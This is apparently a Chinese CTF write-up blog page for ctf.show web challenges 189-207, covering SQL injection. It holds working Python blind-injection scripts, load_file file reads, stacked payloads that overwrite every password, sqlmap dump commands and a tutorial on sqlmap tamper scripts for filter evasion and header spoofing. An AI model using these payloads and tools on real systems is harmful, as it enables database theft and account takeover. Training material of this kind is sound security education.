src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407155009165.png" alt="image-20220407155009165"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407155019582.png" alt="image-20220407155019582"></p><h2 id="load-file-函数盲注文件"><a href="#load-file-函数盲注文件" class="headerlink" title="load_file()函数盲注文件"></a>load_file()函数盲注文件</h2><pre><code class="python"> Author:fengimport requestsurl=&quot;http://356200d4-1b3a-4eff-818f-9c21ccbf8214.challenge.ctf.show/api/index.php&quot;flag=&quot;ctfshow&#123;&quot;for i in range(0,100):    for j in &quot;0123456789abcdefghijklmnopqrstuvwxyz-&#123;&#125;&quot;:        payload=&quot;if((load_file(&#39;/var/www/html/api/index.php&#39;))regexp(&#39;&#123;&#125;&#39;),0,1)&quot;.format(flag+j)        data=&#123;            &#39;username&#39;:payload,            &#39;password&#39;:1        &#125;        r=requests.post(url=url,data=data)        if &quot;\\u5bc6\\u7801\\u9519\\u8bef&quot; in r.text:            flag+=j            print(flag)            if j==&#39;&#125;&#39;:                exit()            break</code></pre><pre><code class="python"># Author：Y4tackerimport requestsurl = &quot;http://3d54cb5b-69e8-4592-85b3-662e3aa01ea5.chall.ctf.show/api/&quot;def getFlagIndex():    head = 1    tail = 300    while head &lt; tail:        mid = (head + tail) &gt;&gt; 1        data = &#123;            &#39;username&#39;: &quot;if(locate(&#39;flag&#123;&#39;,&quot; + &quot;load_file(&#39;/var/www/html/api/index.php&#39;))&gt;&#123;0&#125;,0,1)&quot;.format(str(mid)),            &#39;password&#39;: &#39;1&#39;        &#125;        r = requests.post(url, data=data)        if &quot;密码错误&quot; == r.json()[&#39;msg&#39;]:            head = mid + 1        else:            tail = mid    return middef getFlag(num):    i = int(num)    result = &quot;&quot;    while 1:        head = 32        tail = 127        i = i + 1        while head &lt; tail:            mid = (head + tail) &gt;&gt; 1            data = &#123;                &#39;username&#39;: &quot;if(ascii(substr(load_file(&#39;/var/www/html/api/index.php&#39;),&#123;0&#125;,1))&gt;&#123;1&#125;,0,1)&quot;.format(str(i),                                                                                                               str(                                                                                                                   mid)),                &#39;password&#39;: &#39;1&#39;            &#125;            r = requests.post(url, data=data)            if &quot;密码错误&quot; == r.json()[&#39;msg&#39;]:                head = mid + 1            else:                tail = mid            mid += 1        if head != 32:            result += chr(head)            print(result)        else:            breakif __name__ == &#39;__main__&#39;:    index = getFlagIndex()    getFlag(index)</code></pre><h1 id="web190"><a href="#web190" class="headerlink" title="web190"></a>web190</h1><h2 id="无过滤盲注"><a href="#无过滤盲注" class="headerlink" title="无过滤盲注"></a>无过滤盲注</h2><pre><code class="python"> Author:Y4tackerimport requestsurl = &quot;http://87a2c8d4-69ca-4617-b96c-ce3601bdc1a6.challenge.ctf.show/api/&quot;result = &quot;&quot;i = 0while True:    i = i + 1    head = 32    tail = 127    while head &lt; tail:        mid = (head + tail) &gt;&gt; 1        # 查数据库 ctfshow_fl0g        #payload = &quot;select group_concat(table_name) from information_schema.tables where table_schema=database()&quot;        # 查字段 id,f1ag        #payload = &quot;select group_concat(column_name) from information_schema.columns where table_name=&#39;ctfshow_fl0g&#39;&quot;        # 查flag        payload = &quot;select group_concat(f1ag) from ctfshow_fl0g&quot;        data = &#123;            &#39;username&#39;: f&quot;admin&#39; and if(ascii(substr((&#123;payload&#125;),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,2)=&#39;1&quot;,            &#39;password&#39;: &#39;1&#39;        &#125;        r = requests.post(url,data=data)        if &quot;密码错误&quot;  == r.json()[&#39;msg&#39;]:            head = mid + 1        else:            tail = mid    if head != 32:        result += chr(head)    else:        break    print(result)</code></pre><h1 id="web191"><a href="#web191" class="headerlink" title="web191"></a>web191</h1><h2 id="ord函数盲注"><a href="#ord函数盲注" class="headerlink" title="ord函数盲注"></a>ord函数盲注</h2><pre><code class="python"> Author:Y4tackerimport requestsurl = &quot;http://646c4493-3a66-407e-8ddf-c59355418a23.challenge.ctf.show/api/&quot;result = &quot;&quot;i = 0while True:    i = i + 1    head = 32    tail = 127    while head &lt; tail:        mid = (head + tail) &gt;&gt; 1        # 查数据库 ctfshow_fl0g        #payload = &quot;select group_concat(table_name) from information_schema.tables where table_schema=database()&quot;        # 查字段 f1ag        #payload = &quot;select group_concat(column_name) from information_schema.columns where table_name=&#39;ctfshow_fl0g&#39;&quot;        # 查flag        payload = &quot;select group_concat(f1ag) from ctfshow_fl0g&quot;        data = &#123;            &#39;username&#39;: f&quot;admin&#39; and if(ord(substr((&#123;payload&#125;),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,2)=&#39;1&quot;,            &#39;password&#39;: &#39;1&#39;        &#125;        r = requests.post(url,data=data)        if &quot;密码错误&quot;  == r.json()[&#39;msg&#39;]:            head = mid + 1        else:            # print(r.text)            tail = mid    last = result    if head != 32:        result += chr(head)    else:        break    print(result)</code></pre><p>爆破出来可能是大写的</p><p>主要还是一个地方，就是一般布尔注入都会用改成ascii码值进行比较，正常字符串的比较不也是挨个位置比较ascii码吗？为什么还要多费事的去加一层ascii，这个的原因就是mysql进行字符串比较的时候，是按大写比较的，比如”1ab2AAD”，比较的时候是”1AB2AAD”，所以才会加上那一层ascii，这题ascii被ban了，直接字符串比较的话肯定爆出来的都是大写了。</p><h1 id="web192"><a href="#web192" class="headerlink" title="web192"></a>web192</h1><h2 id="过滤ord和ascii函数"><a href="#过滤ord和ascii函数" class="headerlink" title="过滤ord和ascii函数"></a>过滤ord和ascii函数</h2><pre><code class="python"> Author:fengimport requestsfrom time import timeurl=&#39;http://00b9416c-a0a8-490b-b48b-b2ace6ec42b2.chall.ctf.show:8080/api/index.php&#39;flag=&#39;&#39;for i in range(1,100):    length=len(flag)    min=32    max=128    while 1:        j=min+(max-min)//2        if min==j:            flag+=chr(j)            print(flag.lower())            if chr(j)==&quot; &quot;:                exit()            break        payload=&quot;&#39; or if(substr((select group_concat(f1ag) from ctfshow_fl0g),&#123;&#125;,1)&lt;&#39;&#123;&#125;&#39;,1,0)-- -&quot;.format(i,chr(j))        data=&#123;            &#39;username&#39;:payload,            &#39;password&#39;:1        &#125;        r=requests.post(url=url,data=data).text        #print(r)        if r&quot;\u5bc6\u7801\u9519\u8bef&quot; in r:            max=j        else :            min=j</code></pre><pre><code class="python"> Author:Y4tackerimport requestsimport stringurl = &quot;http://2c0073f7-8662-4a12-a742-f17e1818ed0a.chall.ctf.show/api/&quot;flagstr=&quot; _&#123;&#125;-&quot; + string.ascii_lowercase + string.digitsflag = &#39;&#39;for i in range(1,45):    for j in flagstr:        payload = f&quot;admin&#39; and if(substr((select group_concat(f1ag) from ctfshow_fl0g),&#123;i&#125;,1)regexp(&#39;&#123;j&#125;&#39;),1,2)=&#39;1&quot;        data = &#123;            &#39;username&#39;: payload,            &#39;password&#39;: &#39;1&#39;        &#125;        r = requests.post(url, data=data)        if &quot;密码错误&quot; == r.json()[&#39;msg&#39;]:            flag += j            print(flag)            if &quot;&#125;&quot; == j:                exit(0)            break</code></pre><h1 id="web193"><a href="#web193" class="headerlink" title="web193"></a>web193</h1><h2 id="过滤sustr"><a href="#过滤sustr" class="headerlink" title="过滤sustr"></a>过滤sustr</h2><pre><code class="python"> Author:fengimport requestsurl=&#39;http://fc1e9e65-4116-4635-aebc-05e37fef775f.challenge.ctf.show/api/&#39;flag=&quot;&quot;for i in range(0,100):    for j in &quot;0123456789abcdefghijklmnopqrstuvwxyz-,&#123;&#125;_&quot;:        #payload=&quot;&#39; or if((select group_concat(table_name) from information_schema.tables where table_schema=database()) like &#39;&#123;&#125;&#39;,1,0)-- -&quot;.format(flag+j+&quot;%&quot;)        #payload=&quot;&#39; or if((select group_concat(column_name) from information_schema.columns where table_name=&#39;ctfshow_flxg&#39;) like &#39;&#123;&#125;&#39;,1,0)-- -&quot;.format(flag+j+&quot;%&quot;)        payload=&quot;&#39; or if((select group_concat(f1ag) from ctfshow_flxg) like &#39;&#123;&#125;&#39;,1,0)-- -&quot;.format(flag+j+&quot;%&quot;)        data=&#123;            &#39;username&#39;:payload,            &#39;password&#39;:1        &#125;        #print(payload)        r=requests.post(url=url,data=data)        #print(payload)        if r&quot;\u5bc6\u7801\u9519\u8bef&quot; in r.text:            flag+=j            print(flag)            if j==&#39;&#125;&#39;:                exit()            break</code></pre><pre><code class="python"> Author:Y4tackerimport requestsimport stringurl = &quot;http://fc1e9e65-4116-4635-aebc-05e37fef775f.challenge.ctf.show/api/&quot;flagstr=&quot;0123456789abcdefghijklmnopqrstuvwxyz-,&#123;&#125;_&quot;flag = &#39;&#39;for i in range(1,45):    for j in flagstr:        payload = &quot;select group_concat(table_name) from information_schema.tables where table_schema=database()&quot;        # 查字段 f1ag        # payload = &quot;select group_concat(column_name) from information_schema.columns where table_name=&#39;ctfshow_fl0g&#39;&quot;        #payload = &quot;(select group_concat(f1ag) from ctfshow_fl0g)&quot;        payload = f&quot;admin&#39; and if((&#123;payload&#125;)regexp(&#39;&#123;flag +j&#125;&#39;),1,2)=&#39;1&quot;        print(payload)        data = &#123;            &#39;username&#39;: payload,            &#39;password&#39;: &#39;1&#39;        &#125;        r = requests.post(url, data=data)        if &quot;密码错误&quot; == r.json()[&#39;msg&#39;]:            flag += j            print(flag)            if &quot;&#125;&quot; == j:                exit(0)            break</code></pre><h1 id="web194"><a href="#web194" class="headerlink" title="web194"></a>web194</h1><h2 id="locat-正则注入"><a href="#locat-正则注入" class="headerlink" title="locat()正则注入"></a>locat()正则注入</h2><pre><code class="python"> Author:Y4tackerimport requests# 应该还可以用instr等函数，LOCATE、POSITION、INSTR、FIND_IN_SET、IN、LIKEurl = &quot;http://dee436de-268a-408e-b66a-88b4c972e5f5.chall.ctf.show/api/&quot;final = &quot;&quot;stttr = &quot;flag&#123;&#125;-_1234567890qwertyuiopsdhjkzxcvbnm&quot;for i in range(1,45):    for j in stttr:        final += j        # 查表名-ctfshow_flxg        # payload = f&quot;admin&#39; and if(locate(&#39;&#123;final&#125;&#39;,(select table_name from information_schema.tables where table_schema=database() limit 0,1))=1,1,2)=&#39;1&quot;        # 查字段-f1ag        # payload = f&quot;admin&#39; and if(locate(&#39;&#123;final&#125;&#39;,(select column_name from information_schema.columns where table_name=&#39;ctfshow_flxg&#39; limit 1,1))=1,1,2)=&#39;1&quot;        payload = f&quot;admin&#39; and if(locate(&#39;&#123;final&#125;&#39;,(select f1ag from ctfshow_flxg limit 0,1))=1,1,2)=&#39;1&quot;        data = &#123;            &#39;username&#39;: payload,            &#39;password&#39;: &#39;1&#39;        &#125;        r = requests.post(url,data=data)        if &quot;密码错误&quot; == r.json()[&#39;msg&#39;]:            print(final)        else:            final = final[:-1]</code></pre><pre><code class="python">import requestsimport stringurl = &quot;http://2c0073f7-8662-4a12-a742-f17e1818ed0a.chall.ctf.show/api/&quot;flagstr=&quot; _&#123;&#125;-&quot; + string.ascii_lowercase + string.digitsflag = &#39;&#39;z = &#39;flag&#39;for i in range(1,45):    for j in flagstr:        payload = f&quot;admin&#39; and if((select group_concat(f1ag) from ctfshow_fl0g)regexp(&#39;&#123;j&#125;&#39;),1,2)=&#39;1&quot;        data = &#123;            &#39;username&#39;: payload,            &#39;password&#39;: &#39;1&#39;        &#125;        r = requests.post(url, data=data)        if &quot;密码错误&quot; == r.json()[&#39;msg&#39;]:            flag += j            print(flag)            if &quot;&#125;&quot; == j:                exit(0)            break</code></pre><h1 id="web195"><a href="#web195" class="headerlink" title="web195"></a>web195</h1><h2 id="update堆叠注入"><a href="#update堆叠注入" class="headerlink" title="update堆叠注入"></a>update堆叠注入</h2><p>把所有的密码都改为111，之后登录就好</p><pre><code>0x61646d696e;update`ctfshow_user`set`pass`=0x313131;# 至于为什么非得用十六进制登录，是因为下面这个没有字符串单引号包围sql = &quot;select pass from ctfshow_user where username = &#123;$username&#125;;&quot;;</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407180508467.png" alt="image-20220407180508467"></p><h1 id="web196"><a href="#web196" class="headerlink" title="web196"></a>web196</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407180601416.png" alt="image-20220407180601416"></p><pre><code>  //TODO:感觉少了个啥，奇怪,不会又双叒叕被一血了吧  if(preg_match(&#39;/ |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|\&#39;|\&quot;|select|union|or|and|\x26|\x7c|file|into/i&#39;, $username))&#123;    $ret[&#39;msg&#39;]=&#39;用户名非法&#39;;    die(json_encode($ret));  &#125;</code></pre><p>可能是过滤错了吧</p><pre><code>1;select(1)</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407180656002.png" alt="image-20220407180656002"></p><h1 id="web197-198"><a href="#web197-198" class="headerlink" title="web197-198"></a>web197-198</h1><h2 id="alter更改列名堆叠注入"><a href="#alter更改列名堆叠注入" class="headerlink" title="alter更改列名堆叠注入"></a>alter更改列名堆叠注入</h2><p>利用alter更改列名。一开始想着把username更改为pass，然后查出来的就是字符串用户名，和数字0进行弱类型比较就可以了，但是实际尝试发现不行，看了一下发现这题没有检查传入的password是不是数字，而且没有用intval对password进行处理，所以这样不行，那就把id改成pass，然后爆破id就可以了。</p><pre><code class="mysql">1;alter table `ctfshow_user` change `pass` `feng` varchar(255); alter table `ctfshow_user` change `id` `pass` varchar(255)</code></pre><pre><code class="python"> Author:Y4tackerimport requestsurl = &quot;http://b126bc7c-2b32-461d-9520-30d5baf7a152.chall.ctf.show/api/&quot;for i in range(100):    if i == 0:        data = &#123;            &#39;username&#39;: &#39;0;alter table ctfshow_user change column `pass` `ppp` varchar(255);alter table ctfshow_user &#39;                        &#39;change column `id` `pass` varchar(255);alter table ctfshow_user change column `ppp` `id` &#39;                        &#39;varchar(255);&#39;,            &#39;password&#39;: f&#39;&#123;i&#125;&#39;        &#125;        r = requests.post(url, data=data)    data = &#123;        &#39;username&#39;: &#39;0x61646d696e&#39;,        &#39;password&#39;: f&#39;&#123;i&#125;&#39;    &#125;    r = requests.post(url, data=data)    if &quot;登陆成功&quot; in r.json()[&#39;msg&#39;]:        print(r.json()[&#39;msg&#39;])        break#登陆成功 flag is ctfshow&#123;1e8cd464-117c-4863-a8ea-0e7b83d3d9fe&#125;</code></pre><h1 id="web199-200"><a href="#web199-200" class="headerlink" title="web199-200"></a>web199-200</h1><h2 id="堆叠登录"><a href="#堆叠登录" class="headerlink" title="堆叠登录"></a>堆叠登录</h2><pre><code>1;show tablesctfshow_user</code></pre><p>show tables;会显示表名,也就是ctfshow_user那么这个时候会将查出来的这个值当成密码,也就是密码为ctfshow_user</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407182514272.png" alt="image-20220407182514272"></p><h1 id="web201"><a href="#web201" class="headerlink" title="web201"></a>web201</h1><h2 id="改referer"><a href="#改referer" class="headerlink" title="改referer"></a>改referer</h2><pre><code>探测注入点python sqlmap.py -u http://46015307-d076-4924-bdc0-2d6a2a8bfa53.challenge.ctf.show/api/?id=1 --referer=&quot;ctf.show&quot; --batch数据库python sqlmap.py -u http://46015307-d076-4924-bdc0-2d6a2a8bfa53.challenge.ctf.show/api/?id=1 --referer=&quot;ctf.show&quot; --dbs --batch表名python sqlmap.py -u http://46015307-d076-4924-bdc0-2d6a2a8bfa53.challenge.ctf.show/api/?id=1 --referer=&quot;ctf.show&quot; -D &quot;ctfshow_web&quot; --tables --batch字段名python sqlmap.py -u http://46015307-d076-4924-bdc0-2d6a2a8bfa53.challenge.ctf.show/api/?id=1 --referer=&quot;ctf.show&quot; -D &quot;ctfshow_web&quot; -T ctfshow_user --columns --batch数据python sqlmap.py -u http://46015307-d076-4924-bdc0-2d6a2a8bfa53.challenge.ctf.show/api/?id=1 --referer=&quot;ctf.show&quot; -D &quot;ctfshow_web&quot; -T ctfshow_user -C &quot;pass&quot; --dump --batch</code></pre><h1 id="web202"><a href="#web202" class="headerlink" title="web202"></a>web202</h1><h2 id="post注入"><a href="#post注入" class="headerlink" title="post注入"></a>post注入</h2><pre><code>注入点python sqlmap.py -u http://3c25a99c-6b53-4c1f-8780-ca8fa60d3d76.challenge.ctf.show/api/ --referer=&quot;ctf.show&quot; --data=&quot;id=1&quot; --batch数据库python sqlmap.py -u http://3c25a99c-6b53-4c1f-8780-ca8fa60d3d76.challenge.ctf.show/api/ --referer=&quot;ctf.show&quot; --data=&quot;id=1&quot; --dbs --batch表名python sqlmap.py -u http://3c25a99c-6b53-4c1f-8780-ca8fa60d3d76.challenge.ctf.show/api/ --referer=&quot;ctf.show&quot; --data=&quot;id=1&quot; -D ctfshow_web --tables --batch字段名python sqlmap.py -u http://3c25a99c-6b53-4c1f-8780-ca8fa60d3d76.challenge.ctf.show/api/ --referer=&quot;ctf.show&quot; --data=&quot;id=1&quot; -D ctfshow_web -T ctfshow_user --columns --batch数据python sqlmap.py -u http://3c25a99c-6b53-4c1f-8780-ca8fa60d3d76.challenge.ctf.show/api/ --referer=&quot;ctf.show&quot; --data=&quot;id=1&quot; -D ctfshow_web -T ctfshow_user -C pass --dump --batch</code></pre><h1 id="web203"><a href="#web203" class="headerlink" title="web203"></a>web203</h1><h2 id="请求方式"><a href="#请求方式" class="headerlink" title="请求方式"></a>请求方式</h2><p>必须要加index.php</p><pre><code>注入点python sqlmap.py -u http://481cfdd7-9ef9-4c5d-8aff-e2e9bb555406.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --batch数据库python sqlmap.py -u http://481cfdd7-9ef9-4c5d-8aff-e2e9bb555406.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --dbs --batch表名python sqlmap.py -u http://481cfdd7-9ef9-4c5d-8aff-e2e9bb555406.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; -D ctfshow_web --tables --batch字段名python sqlmap.py -u http://481cfdd7-9ef9-4c5d-8aff-e2e9bb555406.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; -D ctfshow_web -T ctfshow_user --columns --batch数据python sqlmap.py -u http://481cfdd7-9ef9-4c5d-8aff-e2e9bb555406.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; -D ctfshow_web -T ctfshow_user -C pass --dump --batch</code></pre><h1 id="web204"><a href="#web204" class="headerlink" title="web204"></a>web204</h1><h2 id="改cookie"><a href="#改cookie" class="headerlink" title="改cookie"></a>改cookie</h2><pre><code>python sqlmap.py -u http://4d60760f-5063-4ed9-9221-e282903a6cd9.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --cookie=&quot;PHPSESSID=eq5fptfudtbh83i0c0cefg944a; ctfshow=0b535f51ad8cd475e68035ffa3f7fdf7&quot; -D ctfshow_web -T ctfshow_user -C pass --dump --batch</code></pre><h1 id="web205"><a href="#web205" class="headerlink" title="web205"></a>web205</h1><h2 id="访问安全链接"><a href="#访问安全链接" class="headerlink" title="访问安全链接"></a>访问安全链接</h2><p>可以发现查询数据时先去访问了getToken.php,接着才是查询数据</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407200618827.png" alt="image-20220407200618827"></p><pre><code>--safe-url 设置在测试目标地址前访问的安全链接 --safe-freq 设置两次注入测试前访问安全链接的次数</code></pre><pre><code>注入点python sqlmap.py -u http://28de1ae5-a156-44ae-8afb-d42eececfb1f.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://28de1ae5-a156-44ae-8afb-d42eececfb1f.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --batch数据库python sqlmap.py -u http://28de1ae5-a156-44ae-8afb-d42eececfb1f.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://28de1ae5-a156-44ae-8afb-d42eececfb1f.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --batch --dbs表名python sqlmap.py -u http://28de1ae5-a156-44ae-8afb-d42eececfb1f.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://28de1ae5-a156-44ae-8afb-d42eececfb1f.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --batch -D ctfshow_web --tables字段名python sqlmap.py -u http://28de1ae5-a156-44ae-8afb-d42eececfb1f.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://28de1ae5-a156-44ae-8afb-d42eececfb1f.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --batch -D ctfshow_web -T ctfshow_flax --columns数据python sqlmap.py -u http://28de1ae5-a156-44ae-8afb-d42eececfb1f.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://28de1ae5-a156-44ae-8afb-d42eececfb1f.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --batch -D ctfshow_web -T ctfshow_flax -C flagx --dump</code></pre><h1 id="web206"><a href="#web206" class="headerlink" title="web206"></a>web206</h1><pre><code>注入点python sqlmap.py -u http://f943ef60-0a50-452c-bc6d-f4f2d780b509.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://f943ef60-0a50-452c-bc6d-f4f2d780b509.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --batch数据库python sqlmap.py -u http://f943ef60-0a50-452c-bc6d-f4f2d780b509.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://f943ef60-0a50-452c-bc6d-f4f2d780b509.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --batch --dbs表名python sqlmap.py -u http://f943ef60-0a50-452c-bc6d-f4f2d780b509.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://f943ef60-0a50-452c-bc6d-f4f2d780b509.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --batch -D ctfshow_web --tables字段名python sqlmap.py -u http://f943ef60-0a50-452c-bc6d-f4f2d780b509.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://f943ef60-0a50-452c-bc6d-f4f2d780b509.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --batch -D ctfshow_web -T ctfshow_flaxc --columns数据python sqlmap.py -u http://f943ef60-0a50-452c-bc6d-f4f2d780b509.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://f943ef60-0a50-452c-bc6d-f4f2d780b509.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --batch -D ctfshow_web -T ctfshow_flaxc -C flagv --dump</code></pre><h1 id="web207"><a href="#web207" class="headerlink" title="web207"></a>web207</h1><h2 id="sqlmap的tamper编写"><a href="#sqlmap的tamper编写" class="headerlink" title="sqlmap的tamper编写"></a>sqlmap的tamper编写</h2><h3 id="基本结构"><a href="#基本结构" class="headerlink" title="基本结构"></a>基本结构</h3><p>mytamper.py</p><pre><code class="python">#!/usr/bin/env python&quot;&quot;&quot;Copyright (c) 2006-2019 sqlmap developers (http://sqlmap.org/)See the file &#39;doc/COPYING&#39; for copying permission&quot;&quot;&quot;from lib.core.enums import PRIORITY__priority__ = PRIORITY.LOW # 当前脚本调用优先等级def dependencies(): # 声明当前脚本适用/不适用的范围，可以为空。    passdef tamper(payload, **kwargs): # 用于篡改Payload、以及请求头的主要函数    return payload</code></pre><p>把他保存在sqlmap\tamper路径下,然后使用的时候就加上 –tamper&#x3D;mytamper就好了</p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><pre><code class="python">#!/usr/bin/env python&quot;&quot;&quot;Copyright (c) 2006-2019 sqlmap developers (http://sqlmap.org/)See the file &#39;LICENSE&#39; for copying permission&quot;&quot;&quot;import randomfrom lib.core.compat import xrangefrom lib.core.enums import PRIORITY__priority__ = PRIORITY.NORMALdef dependencies():    passdef randomIP():    numbers = []    while not numbers or numbers[0] in (10, 172, 192):        numbers = random.sample(xrange(1, 255), 4)    return &#39;.&#39;.join(str(_) for _ in numbers)def tamper(payload, **kwargs):    &quot;&quot;&quot;    Append a fake HTTP header &#39;X-Forwarded-For&#39;    &quot;&quot;&quot;    headers = kwargs.get(&quot;headers&quot;, &#123;&#125;)    headers[&quot;X-Forwarded-For&quot;] = randomIP()    headers[&quot;X-Client-Ip&quot;] = randomIP()    headers[&quot;X-Real-Ip&quot;] = randomIP()    return payload</code></pre><p>分别包括import部分 __priority__属性 dependencies函数 tamper函数以及用户自定义的函数</p><h3 id="import"><a href="#import" class="headerlink" title="import"></a>import</h3><p>这一部分我们可以导入sqlmap的内部库,sqlmap为我们提供了很多封装好的函数和数据模型,比如下文的PRORITY就来源于 selmap&#x2F;lib&#x2F;core&#x2F;enums.py</p><h3 id="PRIORITY"><a href="#PRIORITY" class="headerlink" title="PRIORITY"></a>PRIORITY</h3><p>PRIORITY是定义tamper的优先级,PRIORITY有以下几个参数</p><ul><li>LOWEST &#x3D; -100</li><li>LOWER &#x3D; -50</li><li>LOW &#x3D; -10</li><li>NORMAL &#x3D; 0</li><li>HIGH &#x3D; 10</li><li>HIGHER &#x3D; 50 </li><li>HIGHER &#x3D; 50</li><li>HIGHEST &#x3D; 100</li></ul><p>如果使用了多个tamper,sqlmap会根据每一个tamper定义的PRIORITY的参数等级来优先使用等级较高的tamper,如果你有两个tamper需要同时用,需要注意</p><h3 id="dependencies"><a href="#dependencies" class="headerlink" title="dependencies"></a>dependencies</h3><p>dependencies主要是提示用户,增tamper支持哪些数据可以支持哪些数据库</p><pre><code class="python">#!/usr/bin/env python&quot;&quot;&quot;Copyright (c) 2006-2019 sqlmap developers (http://sqlmap.org/)See the file &#39;LICENSE&#39; for copying permission&quot;&quot;&quot;from lib.core.enums import PRIORITYfrom lib.core.common import singleTimeWarnMessagefrom lib.core.enums import DBMS__priority__ = PRIORITY.NORMALdef dependencies():    singleTimeWarnMessage(&quot;这是我的tamper提示&quot;)def tamper(payload, **kwargs):    return payload</code></pre><p>DBMS.MYSQL这个参数代表的是Mysql，其他数据库的参数也可以看这个\sqlmap\lib\core\enums.py</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407203541626.png" alt="image-20220407203541626"></p><h3 id="tamper"><a href="#tamper" class="headerlink" title="tamper"></a>tamper</h3><p>tamper这个函数是tamper最重要的函数,你要实现的功能,全部写在这个函数里.payload这个参数就是sqlmap的原始注入payload,我们要实现绕过,一般就是针对这个payload的修改.kwargs是针对http头部的修改,如果你是bypass,是通过修改http头,就需要使用这个</p><h3 id="基于payload"><a href="#基于payload" class="headerlink" title="基于payload"></a>基于payload</h3><p>先来基于修改payload来绕过替换关键字，我使用sqlilab的第一关，并且修改了部分代码来把恶意关键字替换为空来避免联合查询，如图</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407203858410.png" alt="image-20220407203858410"></p><p>编写tamper来双写绕过</p><pre><code class="python">def tamper(payload, **kwargs):    payload = payload.lower()    payload = payload.replace(&#39;select&#39;,&#39;seleselectct&#39;)    payload = payload.replace(&#39;union&#39;,&#39;ununionion&#39;)    return payload</code></pre><p>没有使用tamper之前，我们加上<code>--tech=U</code>来让sqlmap只测试联合查询注入，<code>--flush-session</code>意思是每次刷新会话，清理上次的缓存。</p><pre><code>sqlmap -u http://php.local/Less-1/?id=1 --tech=U --flush-session --proxy=http://127.0.0.1:8080 --random-agent --dbms=mysql</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407203933797.png" alt="image-20220407203933797"></p><p>从burp的流量中看到payload是没有双写的，必然会注入失败。而使用了tamper之后</p><pre><code>sqlmap -u http://php.local/Less-1/?id=1 --tech=U --flush-session --proxy=http://127.0.0.1:8080 --random-agent --tamper=my --dbms=mysql</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407203955653.png" alt="image-20220407203955653"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407204001885.png" alt="image-20220407204001885"></p><h3 id="基于http头"><a href="#基于http头" class="headerlink" title="基于http头"></a>基于http头</h3><p>我没使用sqlmap\tamper\xforwardedfor.py的tamper来讲解</p><pre><code class="python">def tamper(payload, **kwargs):    &quot;&quot;&quot;    Append a fake HTTP header &#39;X-Forwarded-For&#39;    &quot;&quot;&quot;    headers = kwargs.get(&quot;headers&quot;, &#123;&#125;)    headers[&quot;X-Forwarded-For&quot;] = randomIP()    headers[&quot;X-Client-Ip&quot;] = randomIP()    headers[&quot;X-Real-Ip&quot;] = randomIP()    return payload</code></pre><p>从kwargs中取出headers数组，然后修改了xff值达到随机IP的效果，不再赘述。</p><h2 id="Tamper-速查"><a href="#Tamper-速查" class="headerlink" title="Tamper 速查"></a>Tamper 